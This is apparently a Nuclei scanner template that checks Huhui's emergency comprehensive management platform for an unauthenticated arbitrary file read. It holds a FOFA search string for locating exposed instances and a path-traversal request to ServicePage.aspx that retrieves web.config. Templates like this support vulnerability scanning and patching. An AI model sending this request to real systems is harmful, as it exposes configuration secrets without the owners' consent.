id: huhui-emis-servicepage-fileread

info:
  name: Huhui EMIS ServicePage File Read
  author: qwtd
  severity: medium
  description: |
    There is an arbitrary file reading vulnerability in the ServicePage.xml interface of the emergency comprehensive management platform, which allows unauthenticated attackers to access important system files.
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%BA%92%E6%85%A7%E8%BD%AF%E4%BB%B6/%E6%80%A5%E8%AF%8A%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ServicePage.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    max-request: 1
    fofa: body="/emis_lib/js/ThreeExtras.js"
    verified: true
  tags: 互慧软件-急诊综合管理平台

http:
  - method: GET
    path:
      - "{{BaseURL}}/dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<?xml version"
          - "configuration"
        condition: and
      - type: status
        status:
          - 200